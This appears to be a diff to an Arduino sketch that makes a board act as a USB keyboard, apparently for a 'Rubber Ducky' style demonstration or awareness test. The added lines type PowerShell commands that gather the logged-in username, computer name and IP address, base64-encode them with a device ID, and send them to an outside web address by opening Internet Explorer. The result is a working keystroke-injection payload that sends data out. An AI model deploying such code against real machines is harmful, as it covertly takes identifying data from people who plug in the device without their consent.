@@ -1,6 +1,7 @@
   #include <Keyboard.h>
 
 int val = 0;    // variable
+String MYID = "123";
 int lightstart = 0;
 bool button_press = false;
 
@@ -11,11 +12,13 @@ void setup() {
   Keyboard.begin();
 }
 
-void betterPrintln(String line, int mydelay = 50) {
+void betterPrintln(String line, int mydelay = 20, bool pressenter = false) {
         Serial.println("Keyboard emulating: " + line);
         Keyboard.println(line);
-        Keyboard.press(KEY_RETURN);
-        Keyboard.releaseAll();
+        if(pressenter) {
+          Keyboard.press(KEY_RETURN);
+          Keyboard.releaseAll();
+        }
         delay(mydelay);  
 }
 
@@ -34,15 +37,16 @@ void loop() {
         delay(50);
         Keyboard.releaseAll();
         delay(20);
-        betterPrintln("powershell", 300);
-        betterPrintln("echo If you can read this, you managed to either beat the USB Rubber Ducky, or you are running a non-windows OS");
-        betterPrintln("echo And if that last one is the case, consider yourself lucky, this could have ended much worse!");
-        betterPrintln("cls");
-        betterPrintln("$IE=new-object -com internetexplorer.application");
-        // Spaties moeten blijven om toetsenbordinstellingen te omzeilen die dubbele quotes gebruiken voor trema
-        betterPrintln("$IE.navigate2(\" https://www.neverwinternights2.nl/moeilijkestring\" )");
-        betterPrintln("$IE.visible=$true");
-        betterPrintln("exit");
+        betterPrintln("powershell", 300, true);
+        betterPrintln("$var = \" ducky" + MYID +";\" + $env:USERNAME + \" ;\" + $env:COMPUTERNAME + \" ;\" ;");
+        betterPrintln("$ip = Test-Connection -ComputerName $env:COMPUTERNAME -Count 1  | Select IPV4Address ;");
+        betterPrintln("$var += $ip.IPV4Address.IPAddressToString ;");
+        betterPrintln("$var = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($var)) ;");
+        betterPrintln("$var = $var.replace('B', '_') ;");
+        betterPrintln("$IE=new-object -com internetexplorer.application ;");
+        betterPrintln("$IE.navigate2(\" https://www.qaulogy.com/ducky/ducky/\" + $var) ;");
+        betterPrintln("$IE.visible=$true ;", 30, true);
+        betterPrintln("exit", 50, true);
         digitalWrite(13, LOW);
         button_press = false;
     }
